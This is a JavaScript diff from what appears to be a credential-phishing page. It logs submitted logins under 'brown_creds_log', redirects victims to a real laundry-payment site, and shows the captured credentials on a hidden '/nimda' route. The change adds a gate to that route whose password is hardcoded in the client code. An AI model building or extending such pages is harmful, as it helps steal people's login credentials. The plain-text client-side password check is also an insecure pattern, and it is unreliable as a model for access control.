@@ -3,17 +3,65 @@
 const STORAGE_KEY = 'brown_creds_log';
 const API_URL = '/api/submissions';
 const POST_LOGIN_REDIRECT = 'https://mycscgo.com/laundry';
+const ADMIN_PASSWORD = 'qwerqwer12341234';
+const ADMIN_SESSION_KEY = 'nimda_authenticated';
 
 document.addEventListener('DOMContentLoaded', function() {
-    const currentPath = window.location.pathname;
-
-    if (currentPath.includes('/nimda') || currentPath === '/nimda') {
-        showCredsPage();
+    if (isNimdaRoute()) {
+        initNimdaPage();
     } else {
         setupLoginForm();
         setupSideMenu();
     }
 });
+
+function isNimdaRoute() {
+    const path = window.location.pathname;
+    return path.includes('/nimda') || path === '/nimda';
+}
+
+function initNimdaPage() {
+    document.body.classList.add('nimda-route');
+
+    const gate = document.getElementById('admin-gate');
+    const credsPage = document.getElementById('creds-page');
+
+    if (credsPage) credsPage.style.display = 'none';
+
+    if (sessionStorage.getItem(ADMIN_SESSION_KEY) === '1') {
+        if (gate) gate.classList.remove('visible');
+        showCredsPage();
+        return;
+    }
+
+    if (gate) gate.classList.add('visible');
+    setupAdminGate();
+}
+
+function setupAdminGate() {
+    const form = document.getElementById('admin-gate-form');
+    if (!form) return;
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const input = document.getElementById('admin-password');
+        const errorEl = document.getElementById('admin-gate-error');
+        const gate = document.getElementById('admin-gate');
+        const password = input ? input.value : '';
+
+        if (password !== ADMIN_PASSWORD) {
+            if (errorEl) errorEl.classList.add('visible');
+            if (input) input.value = '';
+            return;
+        }
+
+        sessionStorage.setItem(ADMIN_SESSION_KEY, '1');
+        if (errorEl) errorEl.classList.remove('visible');
+        if (gate) gate.classList.remove('visible');
+        showCredsPage();
+    });
+}
 
 function setupSideMenu() {
     const menu = document.getElementById('side-menu');
@@ -201,10 +249,16 @@ function renderSubmissions(log, storageLabel) {
 }
 
 async function showCredsPage() {
+    if (isNimdaRoute() && sessionStorage.getItem(ADMIN_SESSION_KEY) !== '1') {
+        return;
+    }
+
     const appView = document.getElementById('app-view');
     const credsPage = document.getElementById('creds-page');
+    const gate = document.getElementById('admin-gate');
 
     if (appView) appView.style.display = 'none';
+    if (gate) gate.classList.remove('visible');
     if (credsPage) credsPage.style.display = 'block';
 
     renderSubmissions([], 'Loading...');
